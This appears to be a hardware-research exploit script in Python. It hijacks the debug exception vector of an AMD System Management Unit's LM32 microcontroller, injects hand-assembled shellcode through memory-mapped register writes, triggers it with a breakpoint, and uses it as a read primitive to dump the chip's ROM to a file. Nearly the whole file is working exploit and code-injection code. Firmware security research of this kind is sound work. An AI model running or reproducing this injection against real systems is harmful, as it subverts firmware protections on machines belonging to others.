import subprocess

# Thanks to https://github.com/jevinskie/amd-lm32-smu-exploit
SMC_LM32_DEBA = 0x80000334
SMC_LM32_BP0  = 0x80000338
SMC_PC_C      = 0x80000370

# Our communication 'channel'
COMM_ADRC     = 0x3fe80
COMM_DATA     = 0x3fe84


def readl(addr):
    addr_str = hex(addr)
    result = subprocess.run(['./smurw', addr_str], capture_output=True)
    value = int(result.stdout.decode().strip(), 16)
    return value

def writel(addr, value):
    addr_str = hex(addr)
    value_str = hex(value)
    subprocess.run(['./smurw', addr_str, value_str])

def readl_indir(addr):
    writel(COMM_ADRC, addr | 1)
    while readl(COMM_ADRC) != 0:
        pass
    return readl(COMM_DATA)

if __name__ == "__main__":
    # clear communication addr&control
    writel(COMM_ADRC, 0)

    # set debug vector (debug exception = base + 0x20)
    writel(SMC_LM32_DEBA, 0x3f100)
    # load shellcode
    '''
    _s:
        /* r0 = 0 */
        xor     r0, r0, r0
        /* r1 = 0x3fe80 (addr & ctrl ptr) */
        mvhi    r1, 0x0003
        ori     r1, r1, 0xfe80
        /* r2 = [0x3fe80] */
        lw      r2, (r1+0)
        /* extract bit 0 (ctrl) to r3 */
        andi    r3, r2, 0x1
        /* again if not set to 1 */
        be      r3, r0, _s
        /* else, extract addr */
        addi    r2, r2, -1
        /* read from addr, r2 = data */
        lw      r2, (r2+0)
        /* r4 = 0x3fe84 (data ptr) */
        addi    r4, r1, 0x4
        /* store data */
        sw      (r4+0), r2
        /* clear flag */
        sw      (r1+0), r0
        /* again */
        bi      _s
    '''
    writel(0x3f120, 0x98000000)
    writel(0x3f124, 0x78010003)
    writel(0x3f128, 0x3821fe80)
    writel(0x3f12c, 0x28220000)
    writel(0x3f130, 0x20430001)
    writel(0x3f134, 0x4460fffb)
    writel(0x3f138, 0x3442ffff)
    writel(0x3f13c, 0x28420000)
    writel(0x3f140, 0x34240004)
    writel(0x3f144, 0x58820000)
    writel(0x3f148, 0x58200000)
    writel(0x3f14c, 0xe3fffff5)
    # get random PC value
    sample_pc = readl(SMC_PC_C)
    # set breakpoint
    writel(SMC_LM32_BP0, sample_pc | 1)

    fp = open("rom_dump_0x0.bin", 'wb')
    for i in range(0, 0x10000, 4):
        fp.write(readl_indir(i).to_bytes(4, 'big'))
    fp.close()
